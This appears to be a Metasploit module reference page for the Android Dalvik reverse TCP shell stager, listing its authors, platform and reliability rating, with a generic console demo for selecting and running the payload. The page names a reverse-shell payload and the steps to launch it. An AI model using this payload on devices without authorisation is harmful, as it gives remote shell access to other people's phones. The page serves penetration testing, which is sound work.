## Command Shell, Dalvik Reverse TCP Stager

Spawn a piped command shell (sh). Connect back stager


## Module Name
payload/android/shell/reverse_tcp

## Authors
* mihi
* egypt
* timwr
* OJ Reeves





## Platforms
* android

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/android/shell/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    